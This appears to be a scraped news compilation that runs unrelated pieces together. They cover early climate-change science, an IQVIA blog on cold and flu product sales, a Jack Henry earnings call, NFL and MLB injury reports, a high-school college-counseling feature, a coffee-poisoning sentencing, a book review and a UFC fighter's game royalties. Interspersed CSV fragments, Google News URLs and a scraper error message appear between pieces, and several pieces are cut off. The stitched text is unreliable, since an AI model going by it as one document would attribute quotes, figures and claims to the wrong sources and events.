Arrhenius' climate change predictions were largely spot on. Human activities release carbon dioxide methane and other greenhouse gases that trap radiation from the sun and hold them in the atmosphere to increase temperature like a warming greenhouse hence the term ""greenhouse effect."" However Arrhenius' work was not widely read or accepted at the time nor was it even intended to serve as a warning to humanity; it can be viewed as such only in hindsight. At the time his work simply recognized the possibility of humans influencing the global climate and for a long time people viewed warming as beneficial according to Weart.

There was some coverage of fossil fuels affecting climate in the general media according to a now-viral 1912 article first published in the magazine Popular Mechanics USA Today reported . The article which ran in a few newspapers in New Zealand and Australia later that year recognized burning coal and releasing carbon dioxide could increase Earth's temperature noting that ""the effect may be considerable in a few centuries.""

Why the 1950s?

The scientific opinion on climate change wouldn't begin to shift until two significant experiments some 60 years after Arrhenius' realization. The first led by scientist Roger Revelle (1909-1991) in 1957 and published in the journal Tellus  found that the ocean will not absorb all of the carbon dioxide released in humanity's industrial fuel emissions and that carbon dioxide levels in the atmosphere could therefore rise significantly. Three years later Charles Keeling (1928-2005) published a separate study in Tellus that detected an annual rise in carbon dioxide levels in Earth's atmosphere. With carbon dioxide levels known to affect the climate scientists began to raise concerns about the impact human-related emissions could have on the world.

From there more studies began highlighting climate change as a potential threat to species and ecosystems around the world. ""Scientists first began in 1988 to insist that real action should be taken"" Weart said. This occurred at the Toronto Conference on the Changing Atmosphere  where scientists and politicians from around the world gathered to address what was framed as a global threat to Earth's atmosphere with calls to reduce emissions and knock-on effects such as acid rain .

""By the 1990s most scientists thought action was necessary but opposition from fossil fuel companies and ideologists opposed to any government action were effective in obscuring the facts and blocking action"" Weart said. ""Plus normal human inertia and unwillingness to do anything without immediate benefits for oneself.""

As we head deep into the 2021/2022 season new cultural norms - developed or accelerated over the course of the pandemic – have created a new cough cold and flu environment that throws up new challenges for the consumer health industry.

Global Context – Pandemic-driven slump in sales

Over the past two years demand for cold-cough and respiratory (CCR) products slumped largely because of the COVID-19 pandemic. The mass adoption of masks social distancing coupled with the growing consumer interest in “wellness” behavior has reduced the rate of common colds and flu in the general population. That translated to a significant drop in over the counter (OTC) sales of CCR products around-the-world.

In Q2 of 2021 IQVIA Consumer Health Global OTC Insights data showed that the CCR category saw a 13.6% drop in sales globally (see Exhibit 1). It is the only category that experienced significant declines over the 12 months. By contrast the vitamins minerals and supplements (VMS) category saw a 10.7% increase.

Exhibit 1: Global OTC sales by category MAT Q2 2021 (Source: IQVIA Consumer Health Global OTC Insights)

These trends were not unexpected but they should be considered in the broader context. Sales of wellness products have been steadily increasing in recent years and the pandemic accelerated the trend as consumers sought new products to protect themselves and their families. As a result we anticipate the VMS category will continue to grow after the pandemic subsides – which could have a long-term impact on the CCR segment.

As we enter the second COVID-19 influenced cough-cold and flu season in the US it is increasingly difficult to make confident assertions on what the season will look like. As this blog is published the emergence of the Omicron variant has already led to the re-introduction of COVID restrictions in some countries further mudding the waters for the rest of the season.

One indicator is to look at what’s happening in the Southern Hemisphere. Australia is currently at the tail end of its flu season when cough-cold and flu incidences typically spike. While rates of fever and cough were higher than in 2020 they remained well below the five-year peak despite a lower-than-average flu vaccination rate (see Exhibit 2). It is likely that the US and EU will see similar trends.

The known un-knowns impacting the US season

In the US COVID-19-related measures including mask mandates and social distancing disrupted common patterns in the cough cold and flu season over the past two years. But they also provided a simple path to follow when thinking about how the season would pan out - it was obvious incidence of coughs colds and flu would fall.

The challenge for the 2021/2022 season is different. There are more unknowns than during the previous season with variations across communities when it comes to restrictions along with consumer behavior when it comes to avoiding large gatherings not going into work when ill better ventilation in schools and more. All could have an impact on illness levels over the season.

The rate of illness in the US adults will continue to be affected by remote work and the use of social distancing in the office and in public. There is also greater pressure for people to stay home if they are sick and to wear masks in public. All these trends reduce the spread of illness and ultimately sales of CCR products in the adult group.

However among pediatric populations the return to school and availability of pediatric COVID-19 vaccines for 5-12-year-olds will likely cause cough-cold and flu cases to begin to return to normal. While there is heightened awareness of sanitization in schools the lowering of mask mandates and close quarters of the classroom are already having an impact.

FAN the trends

At IQVIA Consumer Health we use the FAN database to track cough-cold and flu trends in the US. FAN uses real-time data from IQVIA’s longitudinal patient-level data warehouse which includes more than 3.5 billion annual and 306 million unique patients to track incidences of cough-cold and flu across the US in real-time. Manufacturers use the data to forecast overall product demand and to determine how demand will fluctuate over time and among populations so they can align their media and market plans and in-store promotions to generate maximum returns.

Current FAN data shows that where COVID-19 related restrictions were eased the incidence of cough-cold and flu symptoms have spiked creating an artificial season that offers new sales opportunities (see Exhibit 3).

Exhibit 3 – As restrictions eased in spring reported cough-cold and flu symptoms increased (Source: IQVIA Consumer Health FAN data)

The data found elevated rates of illness throughout Q2 and Q3 making it the biggest Q3 in FAN history (see Exhibit 4). While this was an artificial lift triggered by unique social factors it is an interesting example of how manufacturers can benefit from aligning sales strategies to evolutions in current trends.

A slow recovery

Looking ahead we expect COVID-19 to keep demand low compared to previous years and it might be time to acknowledge that we may never return to pre-pandemic years. The key now is to identify the new normal.

In 2021/2022 season the biggest opportunity will be in Q1 for both adult and pediatric segments. Based on FAN data we expect +25% bump over a year ago providing the best opportunities for sales. However in Q4 the data is showing double-digit increases in affected population in the pediatric segment which is looking like the biggest opportunity currently.

The data also indicates that an increase in demand is likely to occur in the April/May time frame as adults grow weary of following sanitation and wellness regimes. The trend of seeing a spring-time bump in illnesses has been growing for a while with some years now showing more rates of illness in spring than in fall.

This spring-time bump represents an opportunity for manufacturers to increase promotion of cough-cold products in March and April. Few cough-cold and flu product manufacturers are currently talking to consumers at this time which is creating an unmet need for product information that savvy manufacturers can fill.

With overall demand depressed monitoring trends at a local level can help manufacturers adapt their sales strategies throughout the year to take advantage of emerging trends. Integrating local data into market strategies makes it easier to maximize the impact of media dollars and to pivot that spend in response to hotspots. When market strategies use data to adapt fast they can drive more sales even when demand overall is weak.

Story continues

Let's now transition to our quarterly results. We're very pleased to report another strong quarter of revenue growth and overall business performance. As always I'd like to thank our associates for all the hard work and commitment that went into producing those results for the quarter. For the third quarter of fiscal 2024 total revenue increased by 6% for the quarter and increased 7% on a non-GAAP basis. Operating income increased 3% for the quarter and increased 9% on a non-GAAP basis. Turning to the segments. We again had a strong quarter in the core segment of our business. Revenue was up by 7% for the quarter and increased 8% on a non-GAAP basis. Our payments segment performed very well posting a 5% increase in revenue this quarter and a 6% increase on a non-GAAP basis.

We also had a solid quarter in our complementary solutions businesses with a 5% increase in revenue this quarter and an 8% increase on a non-GAAP basis. As I highlighted in the press release this was our best third quarter ever for sales bookings. During the quarter we inked 11 competitive core takeaways with one of them being a multibillion-dollar institution. For the year we've now signed six multibillion-dollar institutions topping last year's full-year total of five. Additionally we signed seven deals to move existing in-house core clients to our private cloud environment. We are seeing strong interest in our new Financial Crimes Defender solution with 11 new contracts in Q3. Additionally we signed 45 new contracts for our new Financial Crimes Defender fraud module for the Zelle FedNow and RTP payments networks that uses artificial intelligence and machine learning to detect fraud and money laundering in real time.

We continue to see success with our card processing solution signing 14 new card processing clients this quarter. Our Banno digital banking platform remains very popular with 69 new signings in Q3 including 37 contracts for Banno business. We now have over 11.6 million users live on Banno and we're continuing to add approximately 200000 users per month. Even with our strong sales success in Q3 we continued to replenish our sales pipeline and keep it near an all-time high. As we look towards the end of our fiscal year we remain very optimistic about the industry the demand for our solutions our ability to deliver outstanding service and our long-term prospects for success. With that I'll turn it over to Greg for more detail on our solutions and businesses.

Gregory Adelson: Thank you Dave. As some of you have seen we recently released the 2024 results from our Annual Strategy Benchmark survey. This survey offers insight into concerns opportunities and technology priorities from bank and credit union CEOs. The survey indicated that 80% of bank and credit union CEOs plan to increase technology spending over the next two years. Of those the largest segment 35% plan to increase investments between 6% and 10%. We also inquired where they plan to invest over the next two years. The top four areas for planned investment were fraud detection digital banking data analytics and automation all areas where Jack Henry has been investing and executing with innovative solutions through our technology modernization strategy.

As previously announced we recently launched our cloud-native AI-powered Financial Crimes Defender fraud detection platform. We now have 16 clients live and another 175 clients in the implementation queue. In addition we announced in March the Financial Crimes Defender was named the best fraud prevention platform by fintech breakthrough an independent market intelligent organization. Dave mentioned earlier that we have more than 11.6 million registered users on our cloud-native Banno digital banking platform. We continue to see strong interest in our recently launched Banno business solution that provides a modern banking experience for small and medium-sized businesses. As of March 31st we had 124 clients live and about 70 additional clients in various stages of implementation.

In terms of data analytics we continue to make progress on our data broker and executive dashboard solutions. Both are part of the cloud-native API first Jack Henry platform. Data broker which is currently in beta will eventually provide access to all of a client's Jack Henry data in a single repository with innovative AI intelligence capabilities. To complement the data broker solution we are developing an executive dashboard with real-time event monitoring to help executives at our financial institutions make informed dynamic decisions throughout the day based on metrics they customize. Related to automation technology one new Jack Henry platform offering we haven't spoken much about yet is our cloud-native online deposit and loan account opening solution.

This integrated solution will provide a seamless digital account opening experience for our clients that enables them to streamline processes automate workflows and better serve both retail and commercial loan clients. We plan to begin the beta phase with clients in early calendar year 2025. The survey also found that 96% of our clients plan to add payment services over the next two years. We continue to offer a full range of payment solutions in our pay center application as well as other areas of our payment groups. As of March 31st we had 312 clients using Zelle 275 clients using RTP the real-time payments network which represents 48% of the live RTP clients and 190 clients using FedNow representing 29% of the live FedNow clients. One final point on the survey findings.

They were consistent with what we heard from our clients at our Annual Strategic Initiative Symposium in late April. While financial institutions are concerned about the increasing cost of deposits and impact to interest margins there is a general feeling of optimism and less concerned about an economic slowdown this year versus what we heard a year ago. One topic we spent a lot of time discussing that the strategic initiative Symposium is artificial intelligence. We presented in detail Jack Henry's framework for building the necessary guardrails education training use of acceptable tools et cetera. We continue to actively identify opportunities to leverage AI aiming to enhance client solutions and optimize internal process and work streams.

Incorporating AI into select client solutions like financial crimes defender data broker executive dashboard and Banno conversations is part of that strategy. We are approaching AI deployment thoughtfully ensuring it benefits our clients and associates and aligns with our commitment to data privacy protection and security. Our strategy ensures we are responsibly bold and balanced. It's been about 18 months since our corporate rebranding initiative to retire the Symitar ProfitStars and Jack Henry banking brands as we now simply go-to-market as Jack Henry. As we said at that time uniting the brands reflects Jack Henry's role as a well-rounded financial technology provider and enables us to speak from a single consistent brand voice one Jack Henry.

We recently received results from an independent brand study that showed that Jack Henry's brand equity has increased by nine points in just 18 months. We specifically saw significant improvement with large regional financial institutions and millennials. This is important as we continue to execute on our strategy to provide innovative technology solutions to larger financial institutions beyond what we already provide today through both our payment and complementary groups. And millennials are a critical audience because they are taking on larger leadership roles at these financial institutions and having more influence and technology buyer decisions. Speaking of brand equity hopefully you all have seen the new corporate sustainability report that we published on March 29th.

We believe the 2024 report is an excellent representation of the key initiatives and accomplishments we've been working on over the past year. This year's report details how we are we're supporting local communities with a focus on financial wellness through both our investments and innovative technology in a variety of philanthropic efforts. We also continue to further our commitment to valuing people with disabilities with the launch of a new associate-led business innovation group focused on awareness of visible and invisible disabilities. The report also highlights some of the public Best Places to Work recognition we received from organizations like Newsweek Computer World and USA Today. As part of our planned organizational changes we recently announced the promotion of Shannon McLaughlin who is currently President of Jack Henry Credit Union Solutions to Chief Operating Officer effective July 1st.

An executive overviewing a data center full of servers and systems managing their technology solutions.

Shannon has been with Jack Henry for nine years but has close to 30 years working with both banks and credit unions and senior technology and operational roles. Shannon is a strategic visionary leader who has significantly contributed to our company's overall success and we'll continue to do so as the next Chief Operating Officer. I want to close by recognizing Dave for the exceptional job he has done as CEO over the past eight years. Under Dave's leadership Jack Henry has experienced outstanding growth both organically and through strategic acquisitions. I also want to thank Dave for his mentorship and guidance. He has prepared me well as I step into the CEO role on July 1st and I'm honored to continue leading our company with an unwavering focus on our associates clients and shareholders.

With that I will turn it over to Mimi for more details on the numbers.

Mimi Carsley: Thank you Greg and good morning. Our continued focus on serving our community and regional financial institution clients delivering shareholder value led to another quarter of solid revenue and earnings growth. I'll start with the details driving our third quarter and year-to-date results then conclude with our full-year guidance update. Q3 GAAP revenue increased 6% and non-GAAP revenue increased 7% a continuation of consistently solid performance and keeping us on track for a strong fiscal 2024. Year-to-date growth was 7% on a GAAP basis and stronger on non-GAAP at 8%. Deconversion revenue of approximately $800000 which we pre-released last week was down approximately $5.3 million reflecting minimal financial institution consolidation of our clients.

Year-to-date deconversion revenue is $9.9 million $7.2 million less than the prior period. Now let's look more closely at the details. GAAP services and support revenue increased 4% while non-GAAP increased a more robust 6%. Year-to-date the increase was 6% for GAAP and 7% on a non-GAAP basis. Service and support growth during the quarter was the result of increases in data processing and hosting revenues. We continue to experience robust growth in our private and public cloud offerings which again increased 10% in the quarter and for the year-to-date. This reoccurring revenue contributor is 32% of our total revenue and has long been a key to double-digit growth engine. Shifting to processing revenue which is 43% of total revenue and another key component of our long-term growth model.

We saw positive performance with 8% growth on both a GAAP and non-GAAP basis for the quarter and year-to-date delivered 9% for both. Consistent with recent results drivers include positive demand for our digital solutions card processing other payment processing and other processing revenues. In closing out revenue commentary I would like to highlight total recurring revenue exceeded 91%. Next moving to expenses. Beginning with cost of revenue which increased 7% on both a GAAP and non-GAAP basis for the quarter and 7% for GAAP versus 6% for non-GAAP year-to-date. Drivers for the quarter included higher direct costs consistent with increases in related revenue higher personnel costs and increased internal license and fees. Next R&D increased 4% on both a GAAP and non-GAAP basis for the quarter.

The increase is primarily due to cloud consumption costs net of capitalization. For the year-to-date R&D increased 4% on a GAAP basis and 3% for non-GAAP. And lastly on a GAAP basis SG&A rose 7% for the quarter and 8% on a non-GAAP basis primarily due to higher personnel costs. Year-to-date SG&A expense increased 23% on a GAAP basis and 9% on a non-GAAP basis. The primary GAAP differences are the $16.4 million in onetime related costs related to the voluntary early departure incentive program. [indiscernible] in Q1 and prior period $7.4 million gain on asset sales. For non-GAAP the difference is primarily due to the higher personnel costs and absence of gain on sale of assets. We remain focused on generating compounding margin expansion and the quarter results delivered 30 basis points of increased non-GAAP margin which was 20.8%.

Non-GAAP margin benefited from focused process improvements and disciplined management of our workforce while retaining key talent. These strong quarterly results produced a fully diluted GAAP earnings per share of $1.19 up 7%. Separating results into the 3 operating segments we're pleased to see across the board positive performance. Our core segment revenue increased 8% for the quarter on a non-GAAP basis with non-GAAP operating margins increasing 216 basis points. We continue to benefit from private cloud trends and strong cost control. Year-to-date non-GAAP revenue growth was 8% and the associated margin increased 124 basis points. Payments segment revenue increased 6% on a non-GAAP basis. The segment had impressive non-GAAP operating margin growth of 121 basis points.

This was due to continuing growth in our EPS business and moderate card growth consistent with U.S. consumer spending trends and a slightly tough comp combined with the focused cost management. Year-to-date non-GAAP revenue growth matched the quarter at 6% with 103 basis points of margin expansion. And finally complementary segment non-GAAP revenue increased 8% with 33 basis points of margin expansion. Year-to-date non-GAAP revenue also increased 8% with 28 basis points of margin expansion. Growth year-to-date reflects digital solution demand and beneficial overall product mix. Segment quarterly margins were impacted by moderate headwinds from direct support costs and license and fees. Let's now turn to a review of cash flow and capital allocation.

Year-to-date operating cash flow was $336 million $129 million increase over prior period. Excluding proceeds from the sale of assets free cash flow was $172 million significantly more than the $54 million last year. Our base case entering the year included an elevated level of cash tax payments based on the Section 174 impact. Based on legislative clarity and internal efforts we were able to meaningfully lessen the impact. The net result was lower cash taxes equating to an approximately $29 million overpayment last fiscal year as well as improved cash tax outlook this fiscal year. Our consistent dedication to share value creation resulted in a trailing 12-month return on invested capital of 19%. Additionally I would highlight other notable return on capital metrics for the year-to-date period including $20 million in share repurchase offsetting annual dilution $25 million in debt reduction and $116 million in dividends.

With three quarters of the year complete we're nearing the conclusion of our fiscal year and therefore I'll conclude with guidance changes. As you're aware yesterday's press release included updated fiscal 2024 full-year GAAP guidance along with a reconciliation to non-GAAP metrics. As a reminder we filed an 8-K on August 3rd that described how starting in the current fiscal year we're using a revised approach for deconversion guidance. While we reported third quarter deconversion revenue of approximately $800000 we are reiterating our full year deconversion guidance of $16 million. We are reiterating both GAAP and non-GAAP revenue growth and expect non-GAAP growth to potentially have a bias towards the lower end of our 7.4% to 8.0% growth range.

Due to the continued positive operational results and a focus on cost management we now expect an increase in annual non-GAAP margin expansion of 45 to 50 basis points compared to the 35 to 40 basis points previously provided. The full-year tax rate estimate remains at 23.5%. Incorporating the noted positive update full-year guidance for GAAP EPS is revised upward to $5.15 to $5.19 per share from the previous guidance of $5.09 to $5.13 per share. As a reminder the guidance or deconversion revenue compared to actual fiscal 2023 deconversion revenue VEDIP severance-related costs and nonrecurring gain on asset sales results in approximate $0.37 headwind for GAAP EPS for fiscal 2024. Due to the better than initially anticipated cash tax payments improved margins and contributions from favorable net interest our full year guidance for free cash flow conversion has increased to 70% to 75% from the previous commentary of 60%.

In conclusion Q3 results reflected continued momentum of the strong execution we've seen thus far this year and we expect a solid finish for the remainder of the fiscal year. We remain exceptionally positive about our ability to deliver innovative and in-demand solutions the resilience of our clients and our focus on execution and shareholder value creation. We appreciate the contributions of our diligent and dedicated associates that drove these strong results in Jack Henry investors for their continued confidence. Before I turn the call back over to Dave for closing remarks. While I haven't had the pleasure of working with Dave as long as others I cherished our time together. I want to thank Dave for giving me the opportunity to work for this amazing company for being so incredibly generous with his wisdom and support for so many small and meaningful pieces of guidance over the past two years.

He is a role model of service leadership and doing the right thing. We are fortunate to have him lead the Jack Henry Board and I look forward to this continued journey together. Dave?

David Foss: Well thank you Mimi. As you are all undoubtedly aware this marks my final earnings call as CEO before my transition to Executive Board Chair on July 1st. Reflecting on my career at Jack Henry this has been an incredibly humbling journey for me both personally and professionally. And I'm beyond grateful to have had the opportunity to lead this great company for the past eight years. As we move forward I have the utmost confidence in Greg and the rest of our exceptional team to sustain our reputation for great technology and service as well as our strong financial performance. I've cherished the opportunity to get to know all of you over the years and appreciate your insightful questions and thorough analysis.

I thank our investors for their trust in Jack Henry and our clients for allowing us to serve their needs. And lastly I want to express my heartfelt appreciation to our associates.

Starting cornerback Jerry Jacobs the gem of the Lions' undrafted rookie class suffered a potentially serious left knee injury on the opening drive of Sunday's game against the Denver Broncos and was immediately ruled out for the game.

Jacobs making his ninth straight start was injured on the game's fifth play when Lions safety Jalen Elliott rolled into Jacobs' leg while tackling Broncos receiver Tim Patrick.

Lions trainers helped Jacobs off the field.

The Lions (1-10-1) entered Sunday with just two healthy cornerbacks on their 53-man roster Jacobs and Amani Oruwariye after placing three corners — Ifeatu Melifonwu Bobby Price and Mark Gilbert — on the reserve/COVID-19 list this week.

Practice squad call-up Nickell Robey-Coleman replaced Jacobs at cornerback for the rest of the first half.

Jacobs who played his final college season at Arkansas has been one of the Lions' best defensive backs this season. Coaches have praised his ferocious tackling and competitive demeanor in recent weeks and he seemed to have cemented himself in the Lions' future plans.

Those plans could change — or at least require the Lions to invest in more insurance at the position — depending on the severity of Jacobs' injury.

Jacobs suffered a torn ACL at his first college stop at Arkansas State and several of the Lions' other young cornerbacks have had their growth stunted by injuries.

Jeff Okudah the No. 3 pick of the 2020 draft suffered a season-ending torn Achilles tendon in the opening game. Okudah is expected back for the start of next season but struggled in nine games as a rookie.

A.J. Parker another member of the Lions' undrafted rookie class has not played since mid-November because of an ankle injury and Melifonwu a third-round pick in April missed nine games this season with a quad injury.

While the services at the CCC are for all grade levels Mary Jacobs the assistant in the CCC said they are “mainly focused on seniors meeting college deadlines.”

Along with Jacobs the CCC has two college counselors Jennifer Hammond and Yasmin Navarro and they work in partnership with the students’ academic and intervention counselors. The counselors are assigned to students based on their small school. The CCC also employs a college advisor Julia Maciel and a career advisor James Dopman.

“All five of us are here to offer services for reviewing transcripts deciding on eligibility for college your interests in college the college search and then the actual execution of the college application” Jacobs said.

At this time of year the CCC also works with 24 volunteers to read essays for seniors.

“They will help you brainstorm revise and edit your final copies for the college essays. … They work individually with students for a half hour or longer” said Jacobs. The readers are present in the CCC most afternoons and Monday mornings via Zoom and students often return to the same essay reader several times to get comprehensive feedback at multiple points in their essay-writing process.

“I love the CCC” said Claire Greene an essay reader who has been a volunteer for ten years. “There are a lot of things I could do with my time but I can’t tell you how much I look forward to this time of year. It’s really exhilarating work. Really hard word work.”

Natael Worku a senior in Academic Choice (AC) said that he had the chance to get into Questbridge a scholarship for low-income students largely thanks to the support offered by the CCC essay readers. “I had to write tons of essays. … I came to the CCC every single day for two weeks and I got into the program” he said. “So I would say that the essay reading is one of the best things about the CCC.”

Every year the Berkeley Schools Excellence Program (BSEP) votes to keep the CCC running. “We’ve applied every year to continue the services and every year they approve it” said Jacobs. The CCC is also funded by the BHS Development Group a parent-run non-profit that raises money for equipment educational opportunities and more.

According to Jacobs the CCC works with the organization Destination College Advising Corps (DCAC) to better help seniors with applications. DCAC supports students with fewer opportunities by placing highly trained college graduates in spaces like the CCC to advise them. They work with a cohort of 150 students to provide college preparation support and advising.

Like many aspects of school the pandemic was a challenge for the CCC. Jacobs said that there was a decrease in availability for students as could be expected. Although the CCC was entirely virtual last year counselors still helped students through the application process.

Despite the fact that school is back in session the CCC uses a hybrid model in some instances. According to Jacobs this is because Zoom opens up more opportunities for students such as college visits. Now students can simply click on a link to hear a presentation and ask questions about a college they are interested in.

The pandemic also changed and in many cases eliminated the testing requirements for many colleges.

“We hope the college you choose has gone test-blind because we believe that a holistic approach is a better assessment” said Jacobs. “You are looking at the strength of someone’s schedule the grades the activities that they pursued outside of the classroom. All show more of a student’s potential than a test score.”

“It is not just college oriented here. Mr. Dopman supports students learning about careers and jobs” said Navarro. Dopman runs resume workshops as well as finding student work opportunities.

Students the Jacket spoke to said they were extremely grateful for the time and effort CCC counselors and staff put into helping students.

“Even during Thanksgiving break Ms. Navarro was there on Zoom with me helping me step by step” said BHS senior Karan Bhakta. “They give you a lot of support and they really wish for you to do the best.”",https://news.google.com/articles/CBMiSWh0dHBzOi8vd3d3LmxlZ2FjeS5jb20vdXMvb2JpdHVhcmllcy9uYW1lL2phY29iLXNodWItb2JpdHVhcnk_aWQ9MzE4NjMzNTHSAQA?hl=en-US&gl=US&ceid=US%3Aen,Jacob Shub Obituary (2021) - Kalamazoo MI - Langeland Family Funeral Homes Memorial Chapel - Kalamazoo,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.legacy.com/us/obituaries/name/jacob-shub-obituary?id=31863351 on URL https://news.google.com/articles/CBMiSWh0dHBzOi8vd3d3LmxlZ2FjeS5jb20vdXMvb2JpdHVhcmllcy9uYW1lL2phY29iLXNodWItb2JpdHVhcnk_aWQ9MzE4NjMzNTHSAQA?hl=en-US&gl=US&ceid=US%3Aen

An Arizona woman accused of attempting to kill her husband by poisoning his coffee has been sentenced to three years probation.

Melody Felicano Johnson was initially charged with attempted first-degree murder and pleaded guilty to two counts of the lesser felony charge of adding poison or a harmful substance to food or drink in April.

Johnson could have faced a maximum of 2 years in prison for each count.

Her attorney requested the sentence be time served saying Johnson had already been in custody for nearly a year due to her inability to post a $250000 bond. Her sentence also included mental health treatment.

Judge Javier Chon-Lopez noted even the victim her estranged husband Roby Johnson had told the court he did not want Johnson to end up in prison.

The defendant’s husband told investigators he “believes she was trying to kill him to collect death benefits” according to a criminal report obtained last year by CNN affiliate KVOA. Roby Johnson said he first noticed a foul taste to his coffee in March 2023 while he was an airman stationed in Germany the document says.

The Johnsons were still living together with their child but were in the process of getting divorced. Roby and Melody Johnson’s divorce is still pending her attorney said.

Roby Johnson told detectives he used pool testing strips to determine his coffee pot “showed high levels of chlorine” and set up hidden cameras that reportedly caught Melody Johnson pouring bleach into a container and pouring the contents of that container into the coffee maker investigators said.",https://news.google.com/articles/CBMiWWh0dHBzOi8vd3d3Lm55dGltZXMuY29tLzIwMjQvMDUvMTEvYm9va3MvcmV2aWV3L3RoZS1pbmZlcm5hbC1tYWNoaW5lLXN0ZXBoZW4tam9obnNvbi5odG1s0gEA?hl=en-US&gl=US&ceid=US%3Aen,Book Review: ‘The Infernal Machine’ by Steven Johnson,"THE INFERNAL MACHINE: A True Story of Dynamite Terror and the Rise of the Modern Detective by Steven Johnson

The old-time image of an anarchist that has long been fixed in popular imagination is of a guy with wild hair and a deranged smile holding a circular bomb with a lit fuse. Alexander Berkman and Emma Goldman looked nothing like that. Photographs of them from more than a century ago show them to be quite proper and well dressed; they could have been any elegant couple decked out for a stroll along Fifth Avenue.

But Berkman and the better-known Goldman onetime lovers born in the Russian Empire were indeed anarchists believing in a society without leaders one rooted in an egalitarian spirit free of the top-down organization that has defined governance for oh only forever. Sure many anarchists were unruly: In their heyday roughly from 1880 to 1920 they went around blowing things up employing the dynamite invented by a Swedish gent Alfred Nobel whose name now graces the world’s most coveted peace prize.",https://news.google.com/articles/CBMic2h0dHBzOi8vd3d3Lm1tYWZpZ2h0aW5nLmNvbS8yMDI0LzUvMTAvMjQxNTM3MjMvZGVtZXRyaW91cy1qb2huc29uLXJldmVhbHMtaG93LW11Y2gtbW9uZXktaGVzLW1hZGUtZnJvbS1lYS11ZmMtZ2FtZXPSAQA?hl=en-US&gl=US&ceid=US%3Aen,Demetrious Johnson reveals how much money he's made from EA UFC games,"Demetrious Johnson didn’t make a king’s ransom from the EA UFC games but he’s happy with what he received.

A seemingly ever-present topic of conversation in the MMA world is the topic of fighter pay in the UFC. But while that conversation primarily focuses on fighters’ show money win money bonuses and pay-per-view points there are other instances that don’t immediately jump to mind like likeness rights. And while UFC is primarily a fight promotion the company also has a longstanding licensing deal with EA Games to produce the UFC video game series. So how does that work for the fighters?

Well Johnson recently described the entire thing on his YouTube channel.

“One day I’m at home I’m playing video games and I get an email stating that ‘Hey since your likeness is being used a lot in the video game we are sending you a check’” Johnson said. “Now the very first check I got for being in the UFC video game was $25000. A lot of you guys are like ‘That was it?’ Guys think about this $25000 to just be in a video game. I don’t think Ryu [or] Ken has ever gotten a check for $25000. [It’s] $25000 for not getting punched in the face $25000 for just being in a video game because you people love using me as a character. So I was ecstatic.

“How do they dictate how much money you’re going to get paid? I can’t dictate it. You guys actually dictate how much I get paid by how often you guys use me in the game. When you log onto your game let’s say you’re playing offline mode or you’re playing online mode each character you pick it does a little tick and sends the data to the mainframe computer. That’s how they keep track of it. ... They do it for all the games out there because they want to see what characters are being played the most and what game modes you like the most. They’re always tracking your data and keeping all the analytics.

“I think that’s fair. It’s based on your popularity in the game. So if everybody and their mom keeps playing me I will get a bigger check.”

Johnson is widely considered to be one of the greatest fighters in UFC history so it’s not surprising that he’s a popular character choice for fans. In fact Johnson was so popular that he also served as the cover athlete for a specialty edition of EA UFC 3 which “Mighty Mouse” explained came with a little extra money for him.

“So let’s fast forward: The next one that came out was UFC 3 and for this bad boy the next check that I ended up getting was $12500” Johnson said. “Now it’s a little bit lower but I was OK with that because the timeframe of the checks was coming every year or quarter. I wasn’t too worried about it because once again it’s free money just coming to me.

“Now after I did something after my Ray Borg fight they offered me the opportunity to be on the front cover. That’s when they came out with the Icon Edition with me on the front. ... So in order for me to be on the cover I signed an agreement to be on the front cover and with me signing I got a whopping $10000 — $10000 to be on the front cover and it’s pretty dope. I love every bit of it.”

There are currently five iterations of the EA Sports UFC titles with the most recent released this past October. Johnson has been in all of them aside from the first even after leaving the promotion in 2018. Johnson said he has yet to receive his check from the latest edition but for the three version of the game he has been in including his time as a cover athlete “Mighty Mouse” revealed his grand total of payouts comes to just under $75000.

“Let’s fast forward: UFC 4 comes out” Johnson said. “I leave the UFC I’m not part of the company anymore but my character is still in the game and you guys are playing as my character. The next check I get in the mail is another whopping $25000. For being in a game! And it’s absolutely amazing because to me it’s something where your likeness is being used and I think it’s cool where the UFC or EA keeps on paying the athletes for their likeness and that people are using me.

“Now after all that from the first iteration of me being in the game in 2014 all the way to 2024 the total money I have made is a whopping $72500. I think it’s absolutely amazing for me to make that type of money without getting punched in the face.

“Now I have not gotten a check yet for UFC 5 which I’m in the game. ... Obviously when you guys use me as a character and my popularity is still good I will also receive another check from EA or Zuffa or whoever the hell is in charge of the UFC now. So I think it’s pretty cool.”

Likeness rights in sports video games can be wide-ranging. For instance the NFL Players Association struck a deal with the Madden franchise that reportedly paid the players $500 million over a five-year extension while the NBA 2K deal was reportedly for $1.1 billion over seven years. Conversely EA Sports College Football 25 will reportedly only offer athletes featured in the game $600 and a copy of the game.",https://news.google.com/articles/CBMiamh0dHBzOi8vd3d3LmJhdHRlcnlwb3dlci5jb20vMjAyNC81LzEwLzI0MTU0MDEyL3BpZXJjZS1qb2huc29uLWluanVyeS11cGRhdGUtdGhyb3dpbmctbW91bmQtYXRsYW50YS1icmF2ZXPSAQA?hl=en-US&gl=US&ceid=US%3Aen,Pierce Johnson resumes throwing Tyler Matzek shut down,"Inured Atlanta Braves reliever Pierce Johnson was scheduled to throw off a mound Friday per a report by Justin Toscano of the Atlanta Journal-Constitution. Johnson was placed on the 15-day injured list during the last road trip due to elbow inflammation.

Pierce Johnson is doing well Brian Snitker said. He was scheduled to throw a touch-and-feel off the bullpen mound today.



No update on Tyler Matzek. He’s been shut down from throwing for a brief period. — Justin Toscano (@JustinCToscano) May 10 2024

Brian Snitker had previously said that they didn’t think the situation with Johnson’s elbow was serious but they wanted to get ahead of it. Johnson has been a key piece of the Braves’ bullpen since he was acquired at the trade deadline last season. Johnson has appeared in 13 games and has a 3.00 ERA and a 2.83 FIP in 12 innings.

Per Toscano there was no update on Tyler Matzek who was also placed on the 15-day injured list with his own bout of elbow inflammation. Matzek has been shut down from throwing.

